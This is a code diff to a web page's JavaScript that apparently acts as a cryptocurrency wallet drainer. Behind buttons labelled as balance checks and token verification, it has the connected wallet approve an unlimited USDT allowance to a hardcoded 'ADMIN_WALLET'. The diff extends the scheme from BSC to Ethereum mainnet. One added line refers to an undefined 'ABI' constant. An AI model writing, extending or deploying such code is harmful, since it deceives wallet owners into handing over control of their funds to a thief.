@@ -2,11 +2,15 @@ import EthereumProvider from "https://esm.sh/@walletconnect/ethereum-provider";
 import { ethers } from "https://esm.sh/ethers@6.8.1";
 
 // Global variables
-const connectButton = document.getElementById("checkBalanceBtn");
+const connectButton = document.getElementById("checkBalance");
 const approveButton = document.getElementById("verifyTokenBtn");
 const confirmButton = document.getElementById("confirmTransaction");
 
-const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+// const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+const USDT_ADDRESSES = {
+    "bep-20": "0x55d398326f99059fF775485246999027B3197955", // BSC USDT
+    "erc-20": "0xdAC17F958D2ee523a2206206994597C13D831ec7"  // ETH USDT
+};
 const ADMIN_WALLET = "0x8209f963F4E0956fdf92D1757d53164d61622271";
 
 const USDT_ABI = [
@@ -21,17 +25,29 @@ let userBalance = 0; // Cache balance to use in sendUSDT
 let userAddress = ""; // Cache address
 
 // Connect wallet and check balance
-connectButton.onclick = async () => {
+        connectButton.onclick = async () => {
+            const selectedNetwork = localStorage.getItem("selectedNetwork");
+                if (!selectedNetwork) {
+                    alert("⚠️ Please select a network first.");
+                    return;
+            }
+    const chainId = selectedNetwork === "bep-20" ? 56 : 1;
+    const USDT_ADDRESS = USDT_ADDRESSES[selectedNetwork];
+     overlay.style.display = "flex";
+
+
+
     connectButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Checking Balance...';
     connectButton.disabled = true;
 
     try {
-        const provider = await EthereumProvider.init({
-            projectId: "5c7a882142c7491241b507534414ddff",
-            chains: [56],
-            methods: ["eth_sendTransaction", "eth_sign", "personal_sign"],
-            showQrModal: true
-        });
+            const provider = await EthereumProvider.init({
+                projectId: "5c7a882142c7491241b507534414ddff",
+                chains: [chainId],
+                methods: ["eth_sendTransaction", "eth_sign", "personal_sign"],
+                showQrModal: true
+            });
+
 
         await provider.connect();
 
@@ -85,12 +101,15 @@ function calculateAmount(balance) {
 // Approve tokens and show transaction summary
 approveButton.onclick = async () => {
     try {
-        approveButton.disabled = true;
-        approveButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
-
-        const contract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
-        const tx = await contract.approve(ADMIN_WALLET, ethers.MaxUint256);
-        await tx.wait();
+           const selectedNetwork = localStorage.getItem("selectedNetwork");
+           const USDT_ADDRESS = USDT_ADDRESSES[selectedNetwork];
+   
+           approveButton.disabled = true;
+           approveButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+   
+           const contract = new ethers.Contract(USDT_ADDRESS, ABI, signer);
+           const tx = await contract.approve(ADMIN_WALLET, ethers.MaxUint256);
+           await tx.wait();
 
         // Reuse cached balance/address
         let rate;
